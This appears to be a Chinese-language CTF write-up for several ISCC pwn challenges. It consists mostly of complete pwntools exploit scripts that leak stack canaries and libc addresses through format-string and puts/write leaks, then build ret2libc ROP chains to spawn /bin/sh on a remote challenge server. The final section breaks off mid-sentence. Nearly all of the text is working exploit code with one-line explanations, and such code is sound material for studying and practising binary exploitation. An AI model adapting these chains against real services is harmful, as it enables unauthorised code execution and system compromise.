# attachment-7
简单的32位ret2libc，查询出libc版本为 libc6-i386_2.35-0ubuntu3.8_amd64
```python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12400'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vlun = 0x8049210
p.sendlineafter(b'name?\n', b'%23$p')
p.recvuntil(b'\n')
canary = int(p.recv(10), 16)
log.info('canary: ' + hex(canary))

payload = b'a' * (0x4c - 0xc) + p32(canary) + b'a' * 0xc + p32(puts_plt) + p32(vlun) + p32(puts_got)
p.sendlineafter(b'password?\n', payload)
p.recv()
puts_addr = u32(p.recv(4))
log.info('puts_addr: ' + hex(puts_addr))
if local:
    libc = ELF("./libc.so.6")
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
else:
    # from LibcSearcher import LibcSearcher
    # libc = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libc.dump('puts')
    # system_addr = libc_base + libc.dump('system')
    # binsh_addr = libc_base + libc.dump('str_bin_sh')

    libc_base = puts_addr - 0x072880
    system_addr = libc_base + 0x47cd0
    binsh_addr = libc_base + 0x1b90d5


p.sendlineafter(b'name?\n', b'%23$p')
payload = p32(canary) * 20 + p32(system_addr) + p32(0) + p32(binsh_addr)
payload = b'\x00' * (0x40) + p32(canary) + b'\x00' * 0xc + p32(system_addr) + p32(0) + p32(binsh_addr)
debug()
p.sendafter(b'password?\n\n', payload)
p.interactive()


```
# attachment-8
用到了一点点堆的知识，free后在fastbin中，申请同样大小的堆块即可再次编辑存放flag的位置，即可满足检测条件，之后是简单的ret2libc
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12200'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
libc = ELF(libc_path)
main = 0x40135c
pop_rdi = 0x4014c3
ret = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

p.sendlineafter(b'size:', b'96')
p.sendlineafter(b'flag:', b'flag')
p.sendlineafter(b'ISCC', b'a' * 0x18)
p.recvuntil(b'a\n')
canary = u64(p.recv(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
debug()
p.sendlineafter(b'meet you', payload)
p.recvuntil(b'meet you too!\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
p.sendlineafter(b'ISCC', b'a' * 0x18)

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'meet you')
p.sendline(payload)

p.interactive()
```
# call
还是ret2libc，没有puts函数，用write函数泄漏libc基址即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12100'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

pop_rdi = 0x401273
pop_rsi_r15 = 0x401271
ret = 0x40101a
elf = ELF(elf_path)
libc = ELF(libc_path)
write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x401136

payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, 1,
    pop_rsi_r15, write_got, 0,
    write_plt,
    main,
])
p.recvuntil(b'is\n')
p.sendline(payload)
write_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('write_addr: ' + hex(write_addr))
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, binsh_addr,
    system_addr,
])
pause()
debug()
p.sendline(payload)

p.interactive()
```
# attachment-13
堆利用的题，先用un